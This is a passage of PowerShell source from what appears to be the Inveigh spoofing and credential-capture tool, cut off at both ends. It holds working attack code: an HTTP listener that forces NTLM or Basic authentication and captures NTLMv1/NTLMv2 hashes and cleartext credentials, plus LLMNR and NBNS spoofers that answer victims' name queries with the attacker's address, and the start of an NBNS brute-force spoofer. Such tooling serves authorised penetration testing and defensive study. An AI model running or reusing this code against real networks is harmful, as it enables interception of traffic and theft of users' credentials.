            $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
            $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)

            if($NBNSBruteForcePause)
            {
                $inveigh.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                $inveigh.hostname_spoof = $true
            }

            if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
            {
                $HTTP_authorization_header = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
                $HTTP_authorization_header = $HTTP_authorization_header.Substring(0,$HTTP_authorization_header.IndexOf("-0D-0A-"))
                $HTTP_authorization_header = $HTTP_authorization_header.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $authentication_header = New-Object System.String ($HTTP_authorization_header,0,$HTTP_authorization_header.Length)
            }
            else
            {
                $authentication_header =  ""
            }

            if($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous')
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
            }
            else
            {
                $HTTP_response_status_code = 0x34,0x30,0x31
                $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
            }

            $HTTP_type = "HTTP"
            $NTLM = "NTLM"
            $NTLM_auth = $false
            $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString

            if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
            {
                $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")])
            }

            if($authentication_header.startswith('NTLM '))
            {
                $authentication_header = $authentication_header -replace 'NTLM ',''
                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
                $HTTP_response_status_code = 0x34,0x30,0x31
            
                if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                {
                    $HTTP_response_status_code = 0x34,0x30,0x31
                    $NTLM = NTLMChallengeBase64 $Challenge
                    $HTTP_client_close = $false
                }
                elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
                {
                    $NTLM = "NTLM"
                    $HTTP_NTLM_length = DataLength2 20 $HTTP_request_bytes
                    $HTTP_NTLM_offset = DataLength4 24 $HTTP_request_bytes
                    $HTTP_NTLM_domain_length = DataLength2 28 $HTTP_request_bytes
                    $HTTP_NTLM_domain_offset = DataLength4 32 $HTTP_request_bytes
                    [String]$NTLM_challenge = $inveigh.HTTP_challenge_queue -like $HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + '*'
                    $HTTP_challenge_queue.Remove($NTLM_challenge)
                    $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(",")) + 1)
                       
                    if($HTTP_NTLM_domain_length -eq 0)
                    {
                        $HTTP_NTLM_domain_string = ""
                    }
                    else
                    {  
                        $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_offset $HTTP_NTLM_domain_length $HTTP_request_bytes
                    } 
                    
                    $HTTP_NTLM_user_length = DataLength2 36 $HTTP_request_bytes
                    $HTTP_NTLM_user_offset = DataLength4 40 $HTTP_request_bytes
                    $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
                    $HTTP_NTLM_host_length = DataLength2 44 $HTTP_request_bytes
                    $HTTP_NTLM_host_offset = DataLength4 48 $HTTP_request_bytes
                    $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes
        
                    if($HTTP_NTLM_length -eq 24) # NTLMv1
                    {
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(48,':')
                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                    
                        if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {    
                            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP ($HTTP_NTLM_host_string)")])      
                            $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash)
                        
                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n" + $HTTP_NTLM_hash)
                            }
                            else
                            {
                                $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string) for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
                            }

                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                $inveigh.NTLMv1_file_queue.Add($HTTP_NTLM_hash)
                                $inveigh.console_queue.Add("$HTTP_type NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                            }

                            if($inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                            {
                                $inveigh.NTLMv1_username_list.Add("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                            }

                        }

                    }
                    else # NTLMv2
                    {         
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(32,':')
                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response

                        if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {
                            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP ($HTTP_NTLM_host_string)")])
                            $inveigh.NTLMv2_list.Add($HTTP_NTLM_hash)
                        
                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n" + $HTTP_NTLM_hash)
                            }
                            else
                            {
                                $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string) for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
                            }

                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                $inveigh.NTLMv2_file_queue.Add($HTTP_NTLM_hash)
                                $inveigh.console_queue.Add("$HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                            }

                            if($inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                            {
                                $inveigh.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                            }
                        
                        }

                    }

                    if ($inveigh.IP_capture_list -notcontains $HTTP_source_IP -and -not $HTTP_NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $HTTP_source_IP -ne $IP)
                    {
                        $inveigh.IP_capture_list.Add($HTTP_source_IP)
                    }
                
                    $HTTP_response_status_code = 0x32,0x30,0x30
                    $HTTP_response_phrase = 0x4f,0x4b
                    $NTLM_auth = $true
                    $HTTP_client_close = $true
                    $NTLM_challenge = ""
                }
                else
                {
                    $NTLM = "NTLM"
                    $HTTP_client_close = $false
                }

            }
            elseif($authentication_header.startswith('Basic '))
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $authentication_header = $authentication_header -replace 'Basic ',''
                $cleartext_credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($authentication_header))
                $HTTP_client_close = $true
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $HTTP_source_IP")])
                $inveigh.cleartext_file_queue.Add($cleartext_credentials)
                $inveigh.cleartext_list.Add($cleartext_credentials)
                $inveigh.console_queue.Add("$(Get-Date -format 's') - Basic auth cleartext credentials $cleartext_credentials captured from $HTTP_source_IP")

                if($inveigh.file_output)
                {
                    $inveigh.console_queue.Add("Basic auth cleartext credentials written to " + $inveigh.cleartext_out_file)
                }
                 
            }
            else
            {
                if($HTTPAuth -ne 'Anonymous' -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -ne 'Anonymous'))
                {
                    $HTTP_client_close = $false
                }
                else
                {
                    $HTTP_client_close = $true
                }

            }

            $HTTP_timestamp = Get-Date -format r
            $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)

            if((($WPADIP -and $WPADPort) -or $WPADResponse -or $WPADEmptyFile -eq 'Y') -and $HTTP_request_raw_URL -match '/wpad.dat')
            {
                $HTTP_message = $HTTP_WPAD_response
            }
            elseif($HTTPResponse -and $HTTP_request_raw_URL -notmatch '/wpad.dat')
            {
                $HTTP_message = $HTTPResponse
            }
            else
            {
                $HTTP_message = ""
            }

            $HTTP_timestamp = Get-Date -format r
            $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)

            if(($HTTPAuth -eq 'NTLM' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -eq 'NTLM' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$NTLM_auth)
            { 
                $NTLM = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
                $HTTP_message_bytes = 0x0d,0x0a
                $HTTP_content_length_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
                $HTTP_message_bytes += [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)

                $HTTP_response = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                                    $HTTP_response_status_code +
                                    0x20 +
                                    $HTTP_response_phrase +
                                    0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,
                                    0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,
                                    0x0a,0x44,0x61,0x74,0x65,0x3a +
                                    $HTTP_timestamp +
                                    0x0d,0x0a +
                                    $HTTP_WWW_authenticate_header +
                                    $NTLM +
                                    0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,
                                    0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,
                                    0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                                    0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +
                                    $HTTP_content_length_bytes +
                                    0x0d,0x0a +
                                    $HTTP_message_bytes

            }
            elseif(($HTTPAuth -eq 'Basic' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Basic' -and $HTTP_request_raw_URL -match '/wpad.dat'))
            {
                $Basic = [System.Text.Encoding]::UTF8.GetBytes("Basic realm=$HTTPBasicRealm")
                $HTTP_message_bytes = 0x0d,0x0a
                $HTTP_content_length_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
                $HTTP_message_bytes += [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)

                $HTTP_response = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                                    $HTTP_response_status_code +
                                    0x20 +
                                    $HTTP_response_phrase +
                                    0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,
                                    0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,
                                    0x0a,0x44,0x61,0x74,0x65,0x3a +
                                    $HTTP_timestamp +
                                    0x0d,0x0a +
                                    $HTTP_WWW_authenticate_header +
                                    $Basic +
                                    0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,
                                    0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,
                                    0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                                    0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +
                                    $HTTP_content_length_bytes +
                                    0x0d,0x0a +
                                    $HTTP_message_bytes

            }
            else
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $HTTP_message_bytes = 0x0d,0x0a
                $HTTP_content_length_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
                $HTTP_message_bytes += [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)

                $HTTP_response = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                                    $HTTP_response_status_code +
                                    0x20 +
                                    $HTTP_response_phrase +
                                    0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,
                                    0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,
                                    0x0a,0x44,0x61,0x74,0x65,0x3a +
                                    $HTTP_timestamp +
                                    0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,
                                    0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,
                                    0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                                    0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +
                                    $HTTP_content_length_bytes +
                                    0x0d,0x0a +
                                    $HTTP_message_bytes 
            }

            $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)
            $HTTP_stream.Flush()
            Start-Sleep -m 10
            $HTTP_request_raw_URL_old = $HTTP_request_raw_URL
            $HTTP_client_handle_old = $HTTP_client.Client.Handle

            if($HTTP_client_close)
            {
                $HTTP_client.Close()

                if($RunCount -gt 0 -and ($inveigh.NTLMv1_list.Count -ge $run_count_NTLMv1 -or $inveigh.NTLMv2_list.Count -ge $run_count_NTLMv2 -or $inveigh.cleartext_list.Count -ge $run_count_cleartext))
                {
                    $HTTP_listener.Stop()
                    $inveigh.console_queue.Add("Inveigh Unprivileged exited due to run count at $(Get-Date -format 's')")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Brute Force exited due to run count")])
                    $inveigh.unprivileged_running = $false
                    break HTTP_listener_loop                  
                }

            }

        }
        else
        {
            $HTTP_client.Close()
            $HTTP_client_close = $true
        }
    
    }

    $HTTP_client.Close()
    start-sleep -s 1
    $HTTP_listener.Server.blocking = $false
    Start-Sleep -s 1
    $HTTP_listener.Server.Close()
    Start-Sleep -s 1
    $HTTP_listener.Stop()
}

$LLMNR_spoofer_scriptblock = 
{
    param ($LLMNR_response_message,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$LLMNRTTL)

    $LLMNR_running = $true
    $LLMNR_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,5355)

    try
    {
        $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient 5355
    }
    catch
    {
        $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting LLMNR spoofer")
        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting LLMNR spoofer")])
        $LLMNR_running = $false
    }

    $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
    $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
    $LLMNR_UDP_client.Client.ReceiveTimeout = 5000

    while($inveigh.unprivileged_running -and $LLMNR_running)
    {   

        $LLMNR_request_data = $LLMNR_UDP_client.Receive([Ref]$LLMNR_listener_endpoint) # need to switch to async

        if([System.BitConverter]::ToString($LLMNR_request_data[($LLMNR_request_data.Length - 4)..($LLMNR_request_data.Length - 3)]) -ne '00-1c') # ignore AAAA for now
        {
            $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
            [Array]::Reverse($LLMNR_TTL_bytes)

            $LLMNR_response_packet = $LLMNR_request_data[0,1] +
                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                     $LLMNR_request_data[12..$LLMNR_request_data.Length] +
                                     $LLMNR_request_data[12..$LLMNR_request_data.Length] +
                                     $LLMNR_TTL_bytes +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
        
            $LLMNR_query_string = [Text.Encoding]::UTF8.GetString($LLMNR_request_data[13..($LLMNR_request_data[12] + 12)])     
            $source_IP = $LLMNR_listener_endpoint.Address.IPAddressToString

            if(($LLMNR_request_data -and $LLMNR_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $LLMNR_query_string) -and (
            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $LLMNR_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
            $inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP))
            {
                $LLMNR_destination_endpoint = New-Object Net.IPEndpoint($LLMNR_listener_endpoint.Address,$LLMNR_listener_endpoint.Port)
                $LLMNR_UDP_client.Connect($LLMNR_destination_endpoint)
                $LLMNR_UDP_client.Send($LLMNR_response_packet,$LLMNR_response_packet.Length)
                $LLMNR_UDP_client.Close()
                $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient 5355
                $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
                $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
                $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
                $LLMNR_response_message = "- response sent"
            }
            else
            {

                if($SpooferHostsReply -and $SpooferHostsReply -notcontains $LLMNR_query_string)
                {
                    $LLMNR_response_message = "- $LLMNR_query_string is not on reply list"
                }
                elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $LLMNR_query_string)
                {
                    $LLMNR_response_message = "- $LLMNR_query_string is on ignore list"
                }
                elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                {
                    $LLMNR_response_message = "- $source_IP is not on reply list"
                }
                elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                {
                    $LLMNR_response_message = "- $source_IP is on ignore list"
                }
                elseif($inveigh.IP_capture_list -contains $source_IP)
                {
                    $LLMNR_response_message = "- previous capture from $source_IP"
                }
                else
                {
                    $LLMNR_response_message = "- something went wrong"
                }
                                
            }
        
            if($LLMNR_request_data)                   
            {
                $inveigh.console_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")])
            }

        $LLMNR_request_data = ""
        }

    }

    $LLMNR_UDP_client.Close()
 }

$NBNS_spoofer_scriptblock = 
{
    param ($NBNS_response_message,$SpooferIP,$NBNSTypes,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$NBNSTTL)

    $NBNS_running = $true
    $NBNS_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)

    try
    {
        $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
    }
    catch
    {
        $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting NBNS spoofer")
        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting NBNS spoofer")])
        $NBNS_running = $false
    }

    $NBNS_UDP_client.Client.ReceiveTimeout = 5000

    while($inveigh.unprivileged_running -and $NBNS_running)
    {
        
        $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint) # need to switch to async

        if([System.BitConverter]::ToString($NBNS_request_data[10..11]) -ne '00-01')
        {
            $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
            [Array]::Reverse($NBNS_TTL_bytes)

            $NBNS_response_packet = $NBNS_request_data[0,1] +
                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                    $NBNS_request_data[13..$NBNS_request_data.Length] +
                                    $NBNS_TTL_bytes +
                                    0x00,0x06,0x00,0x00 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                                    0x00,0x00,0x00,0x00

            $source_IP = $NBNS_listener_endpoint.Address.IPAddressToString
            $NBNS_query_type = [System.BitConverter]::ToString($NBNS_request_data[43..44])
                    
            switch ($NBNS_query_type)
            {

                '41-41'
                {
                    $NBNS_query_type = "00"
                }

                '41-44'
                {
                    $NBNS_query_type = "03"
                }

                '43-41'
                {
                    $NBNS_query_type = "20"
                }

                '42-4C'
                {
                    $NBNS_query_type = "1B"
                }

                '42-4D'
                {
                    $NBNS_query_type = "1C"
                }

                '42-4E'
                {
                    $NBNS_query_type = "1D"
                }

                '42-4F'
                {
                    $NBNS_query_type = "1E"
                }

            }

            $NBNS_query = [System.BitConverter]::ToString($NBNS_request_data[13..($NBNS_request_data.Length - 4)])
            $NBNS_query = $NBNS_query -replace "-00",""
            $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
            $NBNS_query_string_subtracted = ""
            $NBNS_query_string = ""
            $n = 0
                            
            do
            {
                $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
                $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))
                $n += 1
            }
            until($n -gt ($NBNS_query_string_encoded.Length - 1))
                    
            $n = 0
                    
            do
            {
                $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
                $n += 2
            }
            until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.Length -eq 15)
                                 
            if (($NBNS_request_data -and $NBNS_listener_endpoint.Address.IPAddressToString -ne '255.255.255.255') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (
            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
            $inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP) -and ($NBNSTypes -contains $NBNS_query_type))
            {
                $NBNS_destination_endpoint = New-Object System.Net.IPEndpoint($NBNS_listener_endpoint.Address,137)
                $NBNS_UDP_client.Connect($NBNS_destination_endpoint)
                $NBNS_UDP_client.Send($NBNS_response_packet,$NBNS_response_packet.Length)
                $NBNS_UDP_client.Close()
                $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
                $NBNS_UDP_client.Client.ReceiveTimeout = 5000
                $NBNS_response_message = "- response sent"
            }
            else
            {

                if($NBNSTypes -notcontains $NBNS_query_type)
                {
                    $NBNS_response_message = "- disabled NBNS type"
                }
                elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $NBNS_query_string)
                {
                    $NBNS_response_message = "- $NBNS_query_string is not on reply list"
                }
                elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $NBNS_query_string)
                {
                    $NBNS_response_message = "- $NBNS_query_string is on ignore list"
                }
                elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                {
                    $NBNS_response_message = "- $source_IP is not on reply list"
                }
                elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                {
                    $NBNS_response_message = "- $source_IP is on ignore list"
                }
                elseif($inveigh.IP_capture_list -contains $source_IP)
                {
                    $NBNS_response_message = "- previous capture from $source_IP"
                }
                else
                {
                    $NBNS_response_message = "- something went wrong"
                }
                                    
            }

            if($NBNS_request_data)                   
            {
                 $inveigh.console_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")])
            }

            $NBNS_request_data = ""
        }

    }

    $NBNS_UDP_client.Close()
 }

$NBNS_bruteforce_spoofer_scriptblock = 
{
    param ($SpooferIP,$NBNSBruteForceHost,$NBNSBruteForceTarget,$NBNSBruteForcePause,$NBNSTTL)
   
    $NBNSBruteForceHost = $NBNSBruteForceHost.ToUpper()

    $hostname_bytes = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                        0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00

    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($NBNSBruteForceHost)
    $hostname_encoded = [System.BitConverter]::ToString($hostname_encoded)
    $hostname_encoded = $hostname_encoded.Replace("-","")
    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($hostname_encoded)
    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse($NBNS_TTL_bytes)

    for($i=0; $i -lt $hostname_encoded.Count; $i++)
    {

        if($hostname_encoded[$i] -gt 64)
        {
            $hostname_bytes[$i] = $hostname_encoded[$i] + 10
        }
        else
        {
            $hostname_bytes[$i] = $hostname_encoded[$i] + 17
        }
    
    }

    $NBNS_response_packet = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            $hostname_bytes +
                            0x00,0x20,0x00,0x01 +
                            $NBNS_TTL_bytes +
                            0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                            0x00,0x00,0x00,0x00

    $inveigh.console_queue.Add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget")
    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget")])
    $NBNS_paused = $false          
    $NBNS_bruteforce_UDP_client = New-Object System.Net.Sockets.UdpClient(137)
    $destination_IP = [System.Net.IPAddress]::Parse($NBNSBruteForceTarget)
